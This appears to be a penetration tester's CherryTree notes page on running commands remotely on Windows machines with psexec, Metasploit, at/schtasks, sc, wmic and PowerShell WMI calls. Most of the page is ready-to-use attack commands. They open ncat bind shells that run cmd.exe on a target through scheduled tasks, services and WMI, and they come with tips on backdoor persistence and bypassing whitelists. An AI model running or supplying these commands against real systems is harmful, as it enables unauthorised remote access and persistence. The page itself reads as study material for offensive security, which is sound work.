<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>remote commands (Windows)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>remote commands (Windows)</h1><br/><strong>Prerequisite</strong><br />• Credential for the remote computer<br /><br /><strong><h3>Run Commands on a Remote Windows Machine</h3></strong><br />To run the commands below first we need to setup a connection with the remote machine<br />    <span style="color:#a5452a;">example</span><br />    set up a SMB session<br />    <div class="codebox"><div class="codebox">C:\&gt;&nbsp;net&nbsp;use&nbsp;\\[targetIP]&nbsp;/u:<span style="color:#000000;font-weight:400">[</span>admin_user<span style="color:#000000;font-weight:400">]</span></div></div><br />1) <strong>psexec</strong><br />   ◇ free available from Microsoft Sysinternals but not built into Windows<br />     <div class="codebox"><div class="codebox">C:\&gt;&nbsp;psexec&nbsp;\\[targetIP]&nbsp;[-d]&nbsp;[-u&nbsp;user]&nbsp;[-p&nbsp;password]&nbsp;<span style="color:#000000;font-weight:400">[</span>command<span style="color:#000000;font-weight:400">]</span></div></div><br />       <strong> -s</strong> → the command runs with local SYSTEM privileges on the target<br />        <strong>-d</strong> → psexec don&#39;t wait for process to terminate (non-interactive), useful when invoking a backdoor process, like as a Netcat listener running in the background<br />     PsExec the first time that is been executed create the PsExec service on that target machine and <span style="text-decoration:underline;">is NOT cleaned up once finished</span>. We have to go back and manually remove the PsExec service using the sc command. Note that PsExec module in Metasploit and the PsExec NSE script in Nmap do clean up the services once finished.<br />     <span style="color:#a5452a;">examples:</span><br />     <div class="codebox"><div class="codebox">C:\&gt;&nbsp;psexec.exe&nbsp;\\192.168.1.118&nbsp;ipconfig</div></div><br />     <div class="codebox"><div class="codebox">C:\&gt;&nbsp;psexec.exe&nbsp;\\192.168.1.118&nbsp;cmd.exe&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#gained&nbsp;remote&nbsp;shell&nbsp;on&nbsp;the&nbsp;target&nbsp;machine</div></div><br />        <a href=""><img src="images/1092-1.png" alt="images/1092-1.png" /></a><br />   ◇ psexec exploit module included in Metasploit<br />    <div class="codebox"><div class="codebox">msf&gt;&nbsp;use&nbsp;exploit/windows/smb/psexec</div></div><br />      1- PsExec module establishes the connection<br />      2- writes an executable with a pseudorandom name into the target&#39;s file system<br />      3- creates a service on the target machine, with the service name being a pseudorandom string<br />      4- the service run the executable payload that we have selected. <br />      5- clean up once finished, it deletes the executable and removes the service<br />2) <strong>at</strong> or <strong>schtasks</strong> commands to <em><span style="text-decoration:underline;">schedule</span></em> a job a short time in the future. Useful for persistent BackDoors<br />    <div class="codebox"><div class="codebox">C:\&gt;&nbsp;sc&nbsp;\\[targetIP]&nbsp;query&nbsp;schedule&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#verify&nbsp;first&nbsp;that&nbsp;schedule&nbsp;service&nbsp;is&nbsp;RUNNING<br />C:\&gt;&nbsp;sc&nbsp;\\[targetIP]&nbsp;start&nbsp;schedule&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#start&nbsp;schedule&nbsp;service&nbsp;if&nbsp;not&nbsp;running<br />C:\&gt;&nbsp;net&nbsp;time&nbsp;\\<span style="color:#000000;font-weight:400">[</span>targetIP<span style="color:#000000;font-weight:400">]</span></div></div><br />   ◇ <strong>at</strong> → simpler syntax but limited because we can not select a given user to run the commands(all jobs are run as “SYSTEM”). Moreover from Windows 8.1 the command is been deprecated replaced by schtasks.      <br />        <div class="codebox"><div class="codebox">C:\&gt;&nbsp;at&nbsp;[\\targetIP]&nbsp;[HH:MM][A|P]&nbsp;[command]<br />C:\&gt;&nbsp;at&nbsp;[\\targetIP]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#verify&nbsp;the&nbsp;schedule</div></div><br />        HH:MM → time for the job to start<br />        A|P → A stand for AM. P stand for PM.<br />   ◇ <strong>schtasks</strong> → <br />        <div class="codebox"><div class="codebox">C:\&gt;&nbsp;schtasks&nbsp;/create&nbsp;/tn&nbsp;[taskname]&nbsp;/s&nbsp;[targetIP]&nbsp;/u&nbsp;[user]&nbsp;/p&nbsp;[password]&nbsp;/sc&nbsp;[frequency]&nbsp;/st&nbsp;[starttime]&nbsp;/sd&nbsp;[startdate]&nbsp;/tr&nbsp;[command]<br />C:\&gt;&nbsp;schtasks&nbsp;/query&nbsp;/s&nbsp;[targetIP]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#verify&nbsp;the&nbsp;schedule</div></div><br />        /st [starttime] → HH:MM:SS format<br />        /sc [frequency] → ONCE, MINUTE, HOURLY, DAILY, WEEKLY, ONSTART(every time the system starts),...<br />    <span style="color:#a5452a;">example:</span><br />    create a netcat listner on port 9999 of the target<br />    <div class="codebox"><div class="codebox">C:\&gt;&nbsp;schtasks&nbsp;/create&nbsp;/tn&nbsp;test1&nbsp;/s&nbsp;192.168.1.118&nbsp;/u&nbsp;danie&nbsp;/p&nbsp;Pass&nbsp;/sc&nbsp;once&nbsp;/st&nbsp;12:48&nbsp;/tr&nbsp;&quot;C:\Users\danie\Desktop\ncat\ncat.exe&nbsp;--exec&nbsp;cmd.exe&nbsp;-vnl&nbsp;9999&quot;<br />C:\&gt;&nbsp;ncat.exe&nbsp;192.168.1.118&nbsp;9999&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;connect&nbsp;to&nbsp;the&nbsp;shell&nbsp;created</div></div><br />3) <strong>sc</strong> make a command into a service and run it<br />    Note that there must be a space between “binpath=” and and the command that usually start with the quotation mark <em>&quot;</em><br />    <div class="codebox"><div class="codebox">C:\&gt;&nbsp;sc&nbsp;\\[targetIP]&nbsp;create&nbsp;[svcname]&nbsp;binpath=&nbsp;<span style="color:#000000;font-weight:400">[</span>command<span style="color:#000000;font-weight:400">]</span></div></div><br />    <a href=""><img src="images/1092-2.png" alt="images/1092-2.png" /></a><br />    <div class="codebox"><div class="codebox">C:\&gt;&nbsp;sc&nbsp;\\[targetIP]&nbsp;query&nbsp;<span style="color:#000000;font-weight:400">[</span>svcname<span style="color:#000000;font-weight:400">]</span></div></div><br />    <a href=""><img src="images/1092-3.png" alt="images/1092-3.png" /></a><br />    <div class="codebox"><div class="codebox">C:\&gt;&nbsp;sc&nbsp;\\[targetIP]&nbsp;start&nbsp;<span style="color:#000000;font-weight:400">[</span>svcname<span style="color:#000000;font-weight:400">]</span></div></div><br />    the service [svcname] will run for only 30 seconds after that if not receive a call Windows kills it and return an error<br />    <a href=""><img src="images/1092-4.png" alt="images/1092-4.png" /></a><br />    <span style="color:#a5452a;">example:</span><br />    create a netcat listner on port 9998 of the target<br />    <div class="codebox"><div class="codebox">C:\&gt;&nbsp;sc&nbsp;\\192.168.1.118&nbsp;create&nbsp;test5&nbsp;binpath=&nbsp;&quot;C:\Users\danie\Desktop\ncat\ncat.exe&nbsp;--exec&nbsp;cmd.exe&nbsp;-vnl&nbsp;9998&quot;<br />C:\&gt;&nbsp;sc&nbsp;\\192.168.1.118&nbsp;query&nbsp;test5<br />C:\&gt;&nbsp;sc&nbsp;\\192.168.1.118&nbsp;start&nbsp;test5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#we&nbsp;can&nbsp;check&nbsp;the&nbsp;listener&nbsp;on&nbsp;the&nbsp;target&nbsp;machine&nbsp;with:&nbsp;netstat&nbsp;-ano&nbsp;|&nbsp;find&nbsp;&quot;:9998&quot;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;##&nbsp;in&nbsp;a&nbsp;new&nbsp;window&nbsp;run&nbsp;the&nbsp;next&nbsp;command&nbsp;##<br />C:\&gt;&nbsp;ncat.exe&nbsp;192.168.1.118&nbsp;9998&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#we&nbsp;have&nbsp;to&nbsp;hurry&nbsp;to&nbsp;run&nbsp;the&nbsp;this&nbsp;command&nbsp;because&nbsp;we&nbsp;have&nbsp;the&nbsp;listener&nbsp;only&nbsp;for&nbsp;30&nbsp;seconds</div></div><br /><br />6) <strong>wmic</strong> command, built in to WinXP Pro through Windows 10, can be used to manage Windows 2000 and later systems<br />    <div class="codebox"><div class="codebox">C:\&gt;&nbsp;wmic&nbsp;/node:[targetIP]&nbsp;/user:[admin_user]&nbsp;/password:[password]&nbsp;process&nbsp;call&nbsp;create&nbsp;[command]&nbsp;&nbsp;&nbsp;#create&nbsp;process</div></div><br />    <div class="codebox"><div class="codebox">C:\&gt;&nbsp;wmic&nbsp;/node:192.168.1.118&nbsp;/user:danie&nbsp;/password:Pass&nbsp;process&nbsp;where&nbsp;processid=&quot;[PID]&quot;&nbsp;delete&nbsp;&nbsp;&nbsp;&nbsp;#delete&nbsp;process</div></div><br />    <span style="color:#a5452a;">example:</span><br />    create a netcat listner on port 9997 of the target<br />    <div class="codebox"><div class="codebox">C:\&gt;&nbsp;wmic&nbsp;/node:192.168.1.118&nbsp;/user:danie&nbsp;/password:Pass&nbsp;process&nbsp;call&nbsp;create&nbsp;&quot;C:\Users\danie\Desktop\ncat\ncat.exe&nbsp;--exec&nbsp;cmd.exe&nbsp;-vnl&nbsp;9997&quot;<br />C:\&gt;&nbsp;ncat.exe&nbsp;192.168.1.118&nbsp;9997&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#to&nbsp;connect&nbsp;to&nbsp;the&nbsp;shell&nbsp;created</div></div><br />7) <strong>Get-WmiObject </strong><br />    This allow us to create arbitrary processes that will be run as a child process of the process WmiPrvSE.exe(WMI provider host) process.<br />    <span style="text-decoration:underline;">Whitelist bypass:</span> This can be beneficial in regards to execute a process through other that is likely already a trusted one<br />    <div class="codebox"><div class="codebox">PS&gt;&nbsp;(Get-WmiObject&nbsp;-List&nbsp;Win32_Process).Create<span style="color:#000000;font-weight:400">(</span>&quot;Payload.exe&quot;<span style="color:#000000;font-weight:400">)</span></div></div><br />8) <strong>Invoke-WmiMethod</strong><br />    Very similar to the above <span style="text-decoration:underline;">Get-WmiObject</span><strong> </strong><br />    <div class="codebox"><div class="codebox">PS&gt;&nbsp;Invoke-WmiMethod&nbsp;-Class&nbsp;Win32_Process&nbsp;-Name&nbsp;create&nbsp;-ArgumentList&nbsp;Payload.exe&nbsp;-ComputerName&nbsp;192.168.147.136&nbsp;-Credential&nbsp;<span style="color:#000000;font-weight:400">&lt;</span>username<span style="color:#000000;font-weight:400">&gt;</span></div></div><br />    <a href=""><img src="images/1092-5.png" alt="images/1092-5.png" /></a></div>
</body>
</html>
